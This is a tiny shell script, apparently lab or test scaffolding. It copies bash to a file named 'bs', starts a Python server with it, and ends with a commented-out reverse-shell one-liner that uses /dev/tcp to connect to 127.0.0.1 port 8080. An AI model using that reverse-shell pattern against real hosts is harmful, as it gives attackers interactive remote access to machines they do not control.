# python ./server.py &
# sleep 10
cp /bin/bash ./bs
chmod +x ./bs
./bs python ./server.py &
# ./bs -i >& /dev/tcp/127.0.0.1/8080 0>&1
